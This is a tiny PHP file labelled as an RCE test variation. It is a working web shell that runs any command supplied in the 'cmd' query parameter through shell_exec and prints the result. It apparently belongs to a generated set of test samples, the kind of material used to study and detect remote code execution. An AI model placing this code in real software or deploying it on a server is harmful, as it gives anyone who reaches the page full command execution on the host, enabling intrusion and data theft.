<?php
// RCE test variation #640
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>